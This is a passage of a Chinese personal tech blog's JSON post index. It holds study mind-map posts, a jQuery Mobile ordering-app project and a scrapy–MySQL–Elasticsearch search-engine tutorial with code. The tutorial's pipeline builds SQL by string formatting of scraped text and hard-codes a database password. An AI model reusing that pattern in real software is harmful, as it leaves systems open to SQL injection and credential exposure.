参考文章:文件解析漏洞总结https://www.smi1e.top/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.htmlhttps://github.com/LandGrey/upload-labs-writeup","categories":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"upload","slug":"upload","permalink":"https://blog.cfyqy.com/tags/upload/"}],"author":"ye1s"},{"title":"shell思维导图","slug":"shell思维导图","date":"2019-03-10T07:47:00.000Z","updated":"2020-04-13T08:20:10.320Z","comments":true,"path":"article/e0b981a0.html","link":"","permalink":"https://blog.cfyqy.com/article/e0b981a0.html","excerpt":"思维导图转载来自: https://zhuanlan.zhihu.com/p/37075017","text":"思维导图转载来自: https://zhuanlan.zhihu.com/p/37075017 基础知识 文件 目录 文本处理 shell脚本","categories":[{"name":"操作系统","slug":"操作系统","permalink":"https://blog.cfyqy.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://blog.cfyqy.com/tags/linux/"},{"name":"shell","slug":"shell","permalink":"https://blog.cfyqy.com/tags/shell/"}],"author":"ye1s"},{"title":"前端网页编程思维导图","slug":"前端网页编程思维导图","date":"2019-03-10T03:12:00.000Z","updated":"2021-01-05T03:09:44.718Z","comments":true,"path":"article/67e26511.html","link":"","permalink":"https://blog.cfyqy.com/article/67e26511.html","excerpt":"公众号找到的一张前端思维导图","text":"公众号找到的一张前端思维导图","categories":[{"name":"开发","slug":"开发","permalink":"https://blog.cfyqy.com/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://blog.cfyqy.com/tags/javascript/"},{"name":"html5","slug":"html5","permalink":"https://blog.cfyqy.com/tags/html5/"},{"name":"css","slug":"css","permalink":"https://blog.cfyqy.com/tags/css/"},{"name":"jquery","slug":"jquery","permalink":"https://blog.cfyqy.com/tags/jquery/"}],"author":"ye1s"},{"title":"python思维导图","slug":"thon思维导图","date":"2019-03-10T02:26:00.000Z","updated":"2020-04-13T08:21:18.788Z","comments":true,"path":"article/143ffb8b.html","link":"","permalink":"https://blog.cfyqy.com/article/143ffb8b.html","excerpt":"python的资料网上倒是挺多的,毕竟使用的人多，人工智能和深度学习最近几年越来越火热，python作为其主要语言，2018年自然而然挤到了编程语言使用排名榜第一,打破了java、c、c++稳固的前三状态。找了几份，感觉这份脑图总结的比较全一些。","text":"python的资料网上倒是挺多的,毕竟使用的人多，人工智能和深度学习最近几年越来越火热，python作为其主要语言，2018年自然而然挤到了编程语言使用排名榜第一,打破了java、c、c++稳固的前三状态。找了几份，感觉这份脑图总结的比较全一些。 基本环境 内置类型 表达式 模块 类 元类 函数 迭代器 装饰器 描述符 异常 标准库 扩展库 附录","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.cfyqy.com/tags/python/"}],"author":"ye1s"},{"title":"window批处理","slug":"ndow批处理","date":"2019-03-09T15:42:00.000Z","updated":"2020-04-13T08:15:54.784Z","comments":true,"path":"article/a86a4f7c.html","link":"","permalink":"https://blog.cfyqy.com/article/a86a4f7c.html","excerpt":"window批处理的学习资料网上相对比较少,很多文章都是杂七杂八,写得十分混乱，看的欲望都没。好在找到一篇整理的相对不错的文章，脉络清晰，学起来也相对舒服多了。附上大佬的文章","text":"window批处理的学习资料网上相对比较少,很多文章都是杂七杂八,写得十分混乱，看的欲望都没。好在找到一篇整理的相对不错的文章，脉络清晰，学起来也相对舒服多了。附上大佬的文章 批处理命令的总结windows CMD命令大全及详细解释和语法将大佬的文章整理整理成脑图","categories":[{"name":"操作系统","slug":"操作系统","permalink":"https://blog.cfyqy.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"window批处理","slug":"window批处理","permalink":"https://blog.cfyqy.com/tags/window%E6%89%B9%E5%A4%84%E7%90%86/"},{"name":"window","slug":"window","permalink":"https://blog.cfyqy.com/tags/window/"}],"author":"ye1s"},{"title":"php思维导图","slug":"p思维导图","date":"2019-03-09T07:18:00.000Z","updated":"2020-04-13T08:18:59.730Z","comments":true,"path":"article/c30d453b.html","link":"","permalink":"https://blog.cfyqy.com/article/c30d453b.html","excerpt":"最近这几周，要花点时间把自己所学的一些编程语言，形成一个思维架构，理清知识点,思维脑图确实是一个比较好的选择。网上有挺多整理不错的思维导图，就拿来借用了。","text":"最近这几周，要花点时间把自己所学的一些编程语言，形成一个思维架构，理清知识点,思维脑图确实是一个比较好的选择。网上有挺多整理不错的思维导图，就拿来借用了。 php简介 php安装 PHP语法 PHP数据类型 PHP变量 PHP数组 PHP常量 PHP超级全局变量 PHP魔术变量 PHP运算符 PHP流程语句 PHP函数 PHP命名空间 PHP面向对象 PHP错误与异常","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"思维导图","slug":"思维导图","permalink":"https://blog.cfyqy.com/tags/%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/"},{"name":"php","slug":"php","permalink":"https://blog.cfyqy.com/tags/php/"}],"author":"ye1s"},{"title":"js思维导图","slug":"js思维导图","date":"2019-03-08T09:26:00.000Z","updated":"2020-04-13T08:15:28.941Z","comments":true,"path":"article/9f9d4dd4.html","link":"","permalink":"https://blog.cfyqy.com/article/9f9d4dd4.html","excerpt":"从网上搜集的关于js的思维导图，还不错，就存下了。","text":"从网上搜集的关于js的思维导图，还不错，就存下了。 js数据类型 js变量 js运算符 js流程语句 js数组 js函数基础 js字符串函数 js正则表达式 DOM基础操作 window对象","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://blog.cfyqy.com/tags/javascript/"},{"name":"思维导图","slug":"思维导图","permalink":"https://blog.cfyqy.com/tags/%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/"}],"author":"ye1s"},{"title":"java web复习之思维导图","slug":"va-web复习之思维导图","date":"2019-03-07T09:17:00.000Z","updated":"2020-04-13T08:25:02.200Z","comments":true,"path":"article/ea06f297.html","link":"","permalink":"https://blog.cfyqy.com/article/ea06f297.html","excerpt":"当初学javaweb的时候，以为自己什么都会了，其实很多概念都没有弄清楚，当时的期末考就是一次教训（差点就挂科），时隔一年确实应该在重新弄懂学习一下。很多当时的不以为然，却要在今日花更多的时间来弥补。","text":"当初学javaweb的时候，以为自己什么都会了，其实很多概念都没有弄清楚，当时的期末考就是一次教训（差点就挂科），时隔一年确实应该在重新弄懂学习一下。很多当时的不以为然，却要在今日花更多的时间来弥补。 发点牢骚:连续下了快一周的雨好烦啦!快点停雨！ jsp语法 Servlet JSTL标签 javaBean JSP表达式语言(EL) javaweb汇总图","categories":[{"name":"开发","slug":"开发","permalink":"https://blog.cfyqy.com/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"java web","slug":"java-web","permalink":"https://blog.cfyqy.com/tags/java-web/"}],"author":"ye1s"},{"title":"网络协议通信的思维导图","slug":"网络协议通信的脑图","date":"2019-03-06T11:45:00.000Z","updated":"2019-03-08T09:33:59.941Z","comments":true,"path":"article/36d007a5.html","link":"","permalink":"https://blog.cfyqy.com/article/36d007a5.html","excerpt":"分享几张别人整理得不错的计算机网络脑图","text":"分享几张别人整理得不错的计算机网络脑图 原github地址 https://github.com/caison/java-knowledge-mind-map 互联网协议 TCP和HTTP TCP状态变迁图","categories":[{"name":"网络通信","slug":"网络通信","permalink":"https://blog.cfyqy.com/categories/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1/"}],"tags":[{"name":"计算机网络","slug":"计算机网络","permalink":"https://blog.cfyqy.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"name":"网络协议","slug":"网络协议","permalink":"https://blog.cfyqy.com/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"}],"author":"ye1s"},{"title":"mysql数据库的思维导图","slug":"数据库的一张脑图","date":"2019-03-06T11:32:00.000Z","updated":"2019-10-01T11:18:04.461Z","comments":true,"path":"article/302ec6bd.html","link":"","permalink":"https://blog.cfyqy.com/article/302ec6bd.html","excerpt":"分享几张别人整理得不错的mysql数据库脑图","text":"分享几张别人整理得不错的mysql数据库脑图 原github地址 https://github.com/caison/java-knowledge-mind-map 数据库要点 事务 锁","categories":[{"name":"数据库","slug":"数据库","permalink":"https://blog.cfyqy.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"https://blog.cfyqy.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"mysql","slug":"mysql","permalink":"https://blog.cfyqy.com/tags/mysql/"}],"author":"ye1s"},{"title":"java温习之思维导图","slug":"va温习值思维导图","date":"2019-03-06T07:28:00.000Z","updated":"2020-04-13T08:25:13.657Z","comments":true,"path":"article/d95fa62.html","link":"","permalink":"https://blog.cfyqy.com/article/d95fa62.html","excerpt":"已经快9个月没有碰过java了，很多知识点早就忘了，重新看一厚厚的书，也静不下心来，再说也没有那么多的时间来让我细细品味，只能挑重点从ppt上看起，一段时间后，感觉也没多大用处，还是整理成知识网络比较好，一开始前几章节我自己整理了一下思维脑图，后面的章节发现github有一个整理不错的脑图项目，整理的很棒！我就直接拿来用了，也省得再花费时间去弄。附上java的思维导图，供以后翻阅。","text":"已经快9个月没有碰过java了，很多知识点早就忘了，重新看一厚厚的书，也静不下心来，再说也没有那么多的时间来让我细细品味，只能挑重点从ppt上看起，一段时间后，感觉也没多大用处，还是整理成知识网络比较好，一开始前几章节我自己整理了一下思维脑图，后面的章节发现github有一个整理不错的脑图项目，整理的很棒！我就直接拿来用了，也省得再花费时间去弄。附上java的思维导图，供以后翻阅。 java基础 java面向对象 java集合 java多线程 I/0与文件操作 ArrayList和LinkedList HashMap和 ConcurrentHashMap java线程池","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"java","slug":"java","permalink":"https://blog.cfyqy.com/tags/java/"},{"name":"思维导图","slug":"思维导图","permalink":"https://blog.cfyqy.com/tags/%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/"}],"author":"ye1s"},{"title":"redis初学之思维导图","slug":"dis初学之思维导图","date":"2019-03-04T09:50:00.000Z","updated":"2019-03-25T14:43:32.811Z","comments":true,"path":"article/66d14d5.html","link":"","permalink":"https://blog.cfyqy.com/article/66d14d5.html","excerpt":"以前在看渗透文章的时候，看到过redis的未授权访问漏洞,当时redis的命令都看不懂。今天就学习了一下，redis命令挺多的，记不太牢，只能都简单地运行一下命令，初略地过一下，整理了一张思维导图，供以后翻阅。","text":"以前在看渗透文章的时候，看到过redis的未授权访问漏洞,当时redis的命令都看不懂。今天就学习了一下，redis命令挺多的，记不太牢，只能都简单地运行一下命令，初略地过一下，整理了一张思维导图，供以后翻阅。","categories":[{"name":"数据库","slug":"数据库","permalink":"https://blog.cfyqy.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"https://blog.cfyqy.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"redis","slug":"redis","permalink":"https://blog.cfyqy.com/tags/redis/"}],"author":"ye1s"},{"title":"oracle初学之思维导图","slug":"acle初学之思维导图","date":"2019-03-03T09:15:00.000Z","updated":"2020-04-13T08:04:29.530Z","comments":true,"path":"article/376ab3ed.html","link":"","permalink":"https://blog.cfyqy.com/article/376ab3ed.html","excerpt":"大型的数据库还没使用过，趁着周末的时间，来接触一下oracle.折腾了了周六的大部分白天的时间才算安装成功。第一次，安装没关掉360杀毒软件，一直阻止oracle安装，导致有些oracle服务没安装。准备要把oracle卸载重新安装，却找到不卸载的地方,按着网上的教程，关服务、删注册表、删安装目录，卸载完全后，结果忘记重启电脑，导致第二次安装由失败，心塞。吸取了前两次的经验才总算安装成功。用sql developer连接的时候又出现sid错误，好难受，又弄了好久，才发现连接时sid他默认填写xe,在注册表中查看了sid为orcl，总算连接成功，可以开始学习了。","text":"大型的数据库还没使用过，趁着周末的时间，来接触一下oracle.折腾了了周六的大部分白天的时间才算安装成功。第一次，安装没关掉360杀毒软件，一直阻止oracle安装，导致有些oracle服务没安装。准备要把oracle卸载重新安装，却找到不卸载的地方,按着网上的教程，关服务、删注册表、删安装目录，卸载完全后，结果忘记重启电脑，导致第二次安装由失败，心塞。吸取了前两次的经验才总算安装成功。用sql developer连接的时候又出现sid错误，好难受，又弄了好久，才发现连接时sid他默认填写xe,在注册表中查看了sid为orcl，总算连接成功，可以开始学习了。 发现最近，喜欢用脑图来整理学习过程中的知识点，也好，看看脑图整体，学习起来，也相对舒服多了。 用户 角色 表","categories":[{"name":"数据库","slug":"数据库","permalink":"https://blog.cfyqy.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"}],"tags":[{"name":"oracle","slug":"oracle","permalink":"https://blog.cfyqy.com/tags/oracle/"}],"author":"ye1s"},{"title":"操作系统整理之思维导图","slug":"系统整理之思维导图","date":"2019-02-27T09:44:00.000Z","updated":"2020-04-13T08:31:43.693Z","comments":true,"path":"article/cb928a98.html","link":"","permalink":"https://blog.cfyqy.com/article/cb928a98.html","excerpt":"上学期,因为某些原因基本没去上过操作系统的课，考试前又和比赛冲突，导致只有一天的时间，预习整本书，只潦草地过了一遍书，结果可想而知。大学第一次挂科，这学期开学又要补考，感觉知识点有点多，我记忆力又不太行，老是记不下来，只能将某些章节的知识点整理成思维导图，帮助记忆，特分享出来,有需要的自取。","text":"上学期,因为某些原因基本没去上过操作系统的课，考试前又和比赛冲突，导致只有一天的时间，预习整本书，只潦草地过了一遍书，结果可想而知。大学第一次挂科，这学期开学又要补考，感觉知识点有点多，我记忆力又不太行，老是记不下来，只能将某些章节的知识点整理成思维导图，帮助记忆，特分享出来,有需要的自取。 操作系统概述 进程、线程、作业 中断与处理器调度 互斥、同步、通信 死锁与饥饿 存储管理 文件系统","categories":[{"name":"操作系统","slug":"操作系统","permalink":"https://blog.cfyqy.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"https://blog.cfyqy.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"author":"ye1s"},{"title":"面包物语H5+CSS3+jQuery Mobile的订购系统","slug":"物语html5的订购系统","date":"2018-12-30T09:14:00.000Z","updated":"2020-04-13T08:29:02.831Z","comments":true,"path":"article/e0981382.html","link":"","permalink":"https://blog.cfyqy.com/article/e0981382.html","excerpt":"一个挺简单的纯前端的面包订购系统，此订购系统，不是完全的纯自己写的，大体框架都是书本上的一个订购系统的例子，只是在原有代码的基础上的修修改改。虽不完全是自己写的，但算也是体验了一次把html5打包成apk，在手机上展示的过程。html打包成apk用的是Hbuilder软件，挺方便的的。","text":"一个挺简单的纯前端的面包订购系统，此订购系统，不是完全的纯自己写的，大体框架都是书本上的一个订购系统的例子，只是在原有代码的基础上的修修改改。虽不完全是自己写的，但算也是体验了一次把html5打包成apk，在手机上展示的过程。html打包成apk用的是Hbuilder软件，挺方便的的。 附上本次课设的代码和apk以及录屏展示：链接：https://pan.baidu.com/s/1mmwtazGNdc3nOEWvHITGTQ提取码：q44y面包系统界面图： 本来是没有写这篇文章的必要，但是遇到了一些问题，就在这里做做笔记。 不同html文件的页面跳转第一个主要是关于JQuery Mobile跳转页面后css和js的加载问题。在JQuery Mobile中，页面跳转时默认使用ajax跳转，而页面跳转时默认使用ajax跳转时，只会把在中也内容加载，而之外的代码及文件则不会加载，以致外的js和css失效。 举个栗子： 从某个页面跳转到下面这个页面 ， 下面的page之外css和script将不会被加载。 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta&gt;...&lt;/meta&gt;&lt;link&gt;...&lt;/link&gt;&lt;script&gt;...&lt;/script&gt;&lt;style type=\"text/css\"&gt;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=\"#####\" data-role=\"page\"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 最简单的解决办法：1.标签中使用data-ajax=”false”来禁用页面默认的ajax跳转或者rel=”external” ，从而使用默认的请来求方法请求页面。2.另外的办法：我们可以设置一个全局的禁止ajax方式的跳转，代码： 123$（document）.on(&quot;mobileinit&quot;,function()&#123;$.mobile.ajaxEnabled&#x3D;false;&#125;)； 若使用此法，需要将此代码片段放在你引入的JQuery Mobile的js文件之前（初始化的设置都需放入此处）3.将b页面需要用到的css以及js放在div内(不建议) 同一HTML文件跳转到另一页面问题举个栗子： 12345678910111213141516171819202122232425262728293031323334353637//点击跳转到百度地图api调用的页面 &lt;script type=\"text/javascript\"&gt; function getmap(longitude,latitude)&#123; $.mobile.changePage($(\"#second\"), &#123;transition: 'pop', role: 'dialog' &#125;); mapdiv=document.getElementById(\"allmap\") mapdiv.style.width = '500px'; mapdiv.style.height = '500px'; map = new BMap.Map(\"allmap\"); map.centerAndZoom(new BMap.Point(118.089351,24.460571),13); //map.enableScrollWheelZoom(true); map.addControl(new BMap.NavigationControl()); map.addControl(new BMap.ScaleControl()); map.addControl(new BMap.OverviewMapControl()); map.addControl(new BMap.MapTypeControl()); map.clearOverlays(); var new_point = new BMap.Point(longitude,latitude); var marker = new BMap.Marker(new_point); // 创建标注 map.addOverlay(marker); // 将标注添加到地图中 map.panTo(new_point); var opts = &#123; width : 100, // 信息窗口宽度 height: 50, // 信息窗口高度 title : \"Shop is here\" // 信息窗口标题 &#125; var infoWindow = new BMap.InfoWindow(\"Welcome to you\", opts); // 创建信息窗口对象 map.openInfoWindow(infoWindow, map.getCenter()); // 打开信息窗口&#125;&lt;/script&gt;// 地图的显示区域 &lt;div id=\"allmap\" style=\"width=500px；height=500px;\" &gt;&lt;/div&gt; 按我的理解 id=”allmap”的div都高度和宽度都已经赋值了，为什么还要我mapdiv=document.getElementById(&quot;allmap&quot;) 重新赋值一下，才会显示地图，我现在还是不太理解。 另外一个栗子： 123456789101112131415//跳转到支付页面function getpayment()&#123; $.mobile.changePage($(\"#second\"), &#123;transition: 'pop' , role: 'dialog'&#125;); mapdiv=document.getElementById(\"images\") mapdiv.style.width = '360px'; mapdiv.style.height = '363px'; if($(\"#payment\").size()&lt;=0)&#123; var imgHTM=\"&lt;img src='images/payment.png' id='payment' style='width:360px ;height:360px;'&gt;\" ; $(\"#images\").append(imgHTM); &#125; &#125;//图片的显示区域&lt;div id=\"images\" &gt;&lt;/div&gt; 为什么div的宽和高，还有div中加入一张图片都要js动态赋值和添加才可以显示图片。很疑惑？感觉还是自己太菜了，才搞不懂，继续努力。 参考文章：百度地图JavaScript API开发手册：http://lbsyun.baidu.com/index.php?title=jspopular/guide/helloworld轻松构造APP与引动网站：https://book.douban.com/subject/26330396/JQuery Mobile跳转页面后css和js失效:https://blog.csdn.net/rosemarrytop/article/details/52770930","categories":[{"name":"开发","slug":"开发","permalink":"https://blog.cfyqy.com/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"html5","slug":"html5","permalink":"https://blog.cfyqy.com/tags/html5/"}],"author":"ye1s"},{"title":"潇笑","slug":"杀","date":"2018-12-22T14:21:00.000Z","updated":"2020-04-13T08:28:18.776Z","comments":true,"path":"article/ce57e585.html","link":"","permalink":"https://blog.cfyqy.com/article/ce57e585.html","excerpt":"岁月如梭，白驹过隙，匆匆一年，驰骋而逝，","text":"岁月如梭，白驹过隙，匆匆一年，驰骋而逝， 回首往昔，踌躇满志，大好蓝图，蜗行牛步，所出未果，所获未偿，心厌力疲，时不多矣，任重责多，道阻且艰，心忧重重，但又何妨，回首萧瑟，无风无晴，天道酬勤，有志事成，笑看乾坤，丹心犹存。","categories":[{"name":"其他","slug":"其他","permalink":"https://blog.cfyqy.com/categories/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://blog.cfyqy.com/tags/%E9%9A%8F%E7%AC%94/"}],"author":"yeSi"},{"title":"scrapy+elasticsearch+diango 实现简单的搜索引擎","slug":"scrapy-elasticsearch-diango-实现简单的搜索引擎","date":"2018-11-15T10:52:00.000Z","updated":"2020-04-13T07:27:46.000Z","comments":true,"path":"article/4bb939f5.html","link":"","permalink":"https://blog.cfyqy.com/article/4bb939f5.html","excerpt":"基于爬虫的简单搜索","text":"基于爬虫的简单搜索 此项目可以分为三大部分一爬虫二检索三 web 先附上本次课设的数据和代码链接：https://pan.baidu.com/s/1Shr0HpLWiqHEJT_fCEnvuw 密码：gf0t 爬取学院的数据爬虫主要用主流的scrapy框架，写二十一只爬虫分别爬取各个学院的数据目录结构为：各个学院数据的爬取思路都可以总结为：一、请求首页，爬取菜单栏的链接二、分别请求每个菜单栏连接，爬取每篇文章的链接三、请求每个文章链接，得到文章的标题和内容当然每个网站的具体实现方式根据网站的源码结构而定，下面以计算机工程学院为例： 保存到数据库首先是要在mysql中创建好数据库和表 这里表中只有url、title、content 三字字段，例如： 12345create table cec(url varchar(200) primary key,title varchar(200) not null,content varchar ); 将scrapy中爬取的数据保存在数据库中，有同步和异步写入，scrapy爬取的速度较快。当数据量大的时候同步写入，容易阻塞，这里就采用异步写入的方法 1.在settings配置文件中设置连接参数 123456789101112# 数据库地址MYSQL_HOST = 'localhost'# 数据库用户名:MYSQL_USER = 'root'#数据库密码MYSQL_PASSWORD = 'yesimysql'#数据库端口MYSQL_PORT = 3306#数据库名称MYSQL_DBNAME = 'jimei'#数据库编码MYSQL_CHARSET = 'utf8' 2.在iterms.py 定义Item类 123456789from scrapy.item import Item, Fieldclass JimeiItem(Item): # define the fields for your item here like: # name = scrapy.Field() url=Field() #网站的链接 title=Field() # 网站的标题 content=Field() #网站的内容 3.在pipelines文件中声明一个pipeline类 1234567891011121314151617181920212223242526272829303132333435363738from pymysql import cursorsfrom twisted.enterprise import adbapifrom scrapy.conf import settingsfrom jimei.items import JimeiItemclass jimeiPipeline(object): def __init__(self,db_pool): self.db_pool=db_pool @classmethod def from_settings(cls,settings): db_params=dict( host=settings['MYSQL_HOST'], user=settings['MYSQL_USER'], password=settings['MYSQL_PASSWORD'], port=settings['MYSQL_PORT'], database=settings['MYSQL_DBNAME'], charset=settings['MYSQL_CHARSET'], use_unicode=True, #设置游标类型 cursorclass=cursors.DictCursor) # 创建连接池 db_pool=adbapi.ConnectionPool('pymysql',**db_params) # 返回一个pipline对象 return cls(db_pool) def process_item(self,item,spider): #asynItem = copy.deepcopy(item) ## 把要执行的sql放入连接池 query=self.db_pool.runInteraction(self.insert_into,item) # 如果sql执行发送错误,自动回调addCallBack()函数 query.addCallback(self.handle_error) def insert_into(self,cursor,item): #创建sql sql=\"insert into szb (url,title,content) values ('&#123;&#125;','&#123;&#125;','&#123;&#125;')\".format(item['url'],item['title'],item['content']) #执行sql语句 cursor.execute(sql) def handle_error(self,failure): #输出错误信息 print(failure) 4.启用pipeline在settings.py中配置 123ITEM_PIPELINES = &#123; 'jimei.pipelines.jimeiPipeline': 300,#根据自己的项目名、类修改&#125; 5.在爬虫中声明一个item实例，对各个属性进行赋值 例如本次课设中最后提取文章的标题和内容的处理 1234567891011121314from jimei.items import JimeiItem def parse_text(self,response): selector= scrapy.Selector(response) title=selector.xpath(\"//title/text()\").extract()[0] #得到页面的标题 url=response.url #页面链接 #content=selector.xpath(\"string(//form[@name='form124904a'])\").extract()[0].replace(u'\\r\\n','').replace(u'\\xa0',u'') content1=selector.css(\"form[name='form124904a'] *:not(style)::text\").extract() #得到页面的内容 content=\"\".join(content1).replace(u'\\r\\n','').replace(u'\\xa0',u'').replace(' ','').replace('\\'','').replace('\\\"','') item=JimeiItem() item['url']=url item['title']=title item['content']=content yield item elasticsearch 安装首先到官网上下载对应系统版本的elasticsearchhttps://www.elastic.co/downloads/elasticsearch 首先把安装包下载下来并解压，然后运行 bin/elasticsearch（Mac 或 Linux）或者 bin\\elasticsearch.bat (Windows) 即可启动 Elasticsearch 了。 解压压缩包至指定路径，程序启动入口 elasticsearch-6.4.0\\bin\\elasticsearch.batelasticsearch 启动闪退解决：elasticsearch 依赖JDK，必须是1.8以上版本JDK head插件安装window下的安装，挺详细的https://www.cnblogs.com/545018520xq/articles/8972036.html IK中文分词器安装window下的安装，挺详细的https://www.cnblogs.com/youran-he/p/7381291.html logstash安装到官网下载leasticsearch对应版本的logstashhttps://www.elastic.co/downloads/logstash logstash同步mysql数据到elasticsearch1.下载后在logstash\\bin目录位置使用logstash-plugin install logstash-input-jdbc 命令安装jdbc的数据连接插件2.logstash\\bin目录新增mysql-es.conf文件，配置Input和output参数如下，连接jdbc按照规则同步指定的数据到es，这里的配置有很多种用法。 123456789101112131415161718192021222324252627282930313233343536373839404142input&#123; jdbc &#123; jdbc_driver_library =&gt; \"mysql-connector-java-5.1.44-bin.jar\" jdbc_driver_class =&gt; \"com.mysql.jdbc.Driver\" jdbc_connection_string =&gt; \"jdbc:mysql://127.0.0.1:3306/jimei\" jdbc_user =&gt; \"root\" jdbc_password =&gt; \"yesimysql\" jdbc_paging_enabled =&gt; \"true\" jdbc_page_size =&gt; \"5000\" jdbc_default_timezone =&gt;\"Asia/Shanghai\" schedule =&gt; \"* * * * *\" statement =&gt; \"select * from szb\" last_run_metadata_path =&gt; \"./logstash_jdbc_last_run\" &#125; &#125; filter &#123; json &#123; source =&gt; \"message\" remove_field =&gt; [\"message\"]&#125;mutate &#123; #需要移除的字段 remove_field =&gt; \"@timestamp\" remove_field =&gt; \"type\" # remove_field =&gt; \"@version\"&#125;&#125;output&#123; elasticsearch &#123; hosts =&gt; \"127.0.0.1:9200\" index =&gt; \"szb\" document_type =&gt; \"szb\" # 需要关联的数据库中有一个publication_number字段，对应索引的id号 document_id =&gt; \"%&#123;url&#125;\" template_overwrite =&gt; true template =&gt; \"template/logstash-ik.json\" &#125; stdout &#123; codec =&gt; json_lines &#125; &#125; 3.template设置mapping 123456789101112131415161718192021222324252627282930313233&#123; \"mappings\": &#123; \"properties\": &#123; \"url\": &#123; \"type\": \"keyword\" &#125;, \"title\": &#123; \"norms\": false, \"analyzer\": \"ik_max_word\",# 采用ik分词器 \"search_analyzer\": \"ik_max_word\", \"type\": \"text\", \"fields\": &#123; \"keyword\": &#123; \"type\": \"keyword\" &#125; &#125; &#125;, \"content\": &#123; \"norms\": false, \"analyzer\": \"ik_max_word\", \"search_analyzer\": \"ik_max_word\", \"type\": \"text\", \"fields\": &#123; \"keyword\": &#123; \"type\": \"keyword\" &#125; &#125; &#125; &#125; &#125;&#125; 4 在logstash\\bin目录命令行下运行5.同步后的结果logstash使用template提前设置好maping同步mysql数据到Elasticsearch。也可以参考此文章https://www.cnblogs.com/jstarseven/p/7707499.html python操作elasticsearch参考此文章https://cuiqingcai.com/6214.html es的查询语句实例： 12345678910111213141516171819202122232425&#123;\"query\": &#123;\"bool\": &#123;\"must\":[&#123;\"match\":&#123;\"title\":\"计算\"&#125;&#125;, &#123;\"match\":&#123;\"content\":\"计算\"&#125;&#125;]&#125;&#125;,\"from\":1,\"size\":2, \"_source\": &#123; \"includes\" : [ \"title\", \"content\" ] &#125;,\"highlight\": &#123; \"pre_tags\": [\"&lt;span class='keyword'&gt;\"], \"post_tags\": [\"&lt;/span&gt;\"], \"fields\": &#123; \"content\": &#123; \"type\": \"plain\" &#125; &#125; &#125;&#125; 最终结果展示参考文章：scrapy爬虫学习 http://www.scrapyd.cn/doc/140.html学习elasticsearch不错的博客 https://www.cnblogs.com/adc8868/default.html?page=5django学习https://code.ziqiangxuetang.com/django/django-install.htmlScrapy基于Mysql数据库异步写入数据库 https://blog.csdn.net/baoshuowl/article/details/79658312window下head插件的安装 https://www.cnblogs.com/545018520xq/articles/8972036.htmlwindow下ik中文分词器的安装 https://www.cnblogs.com/youran-he/p/7381291.htmllogstash使用template提前设置好maping同步mysql数据到Elasticsearch https://www.cnblogs.com/jstarseven/p/7707499.html","categories":[{"name":"开发","slug":"开发","permalink":"https://blog.cfyqy.com/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"https://blog.cfyqy.com/tags/%E7%88%AC%E8%99%AB/"},{"name":"搜索引擎","slug":"搜索引擎","permalink":"https://blog.cfyqy.com/tags/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/"}],"author":"ye1s"},{"title":"优秀博客","slug":"秀博客","date":"2018-10-11T04:26:54.000Z","updated":"2020-06-23T05:02:51.883Z","comments":true,"path":"article/bb158cde.html","link":"","permalink":"https://blog.cfyqy.com/article/bb158cde.html","excerpt":"一些博客收集","text":"一些博客收集 友链qiukuman&nbsp;&nbsp;&nbsp;&nbsp;ifuryst&nbsp;&nbsp;&nbsp;&nbsp;叶凡&nbsp;&nbsp;&nbsp;&nbsp;Wuzebiao&nbsp;&nbsp;&nbsp;&nbsp;jason&nbsp;&nbsp;&nbsp;&nbsp;xF0rk 平台洛谷 / 题目列表 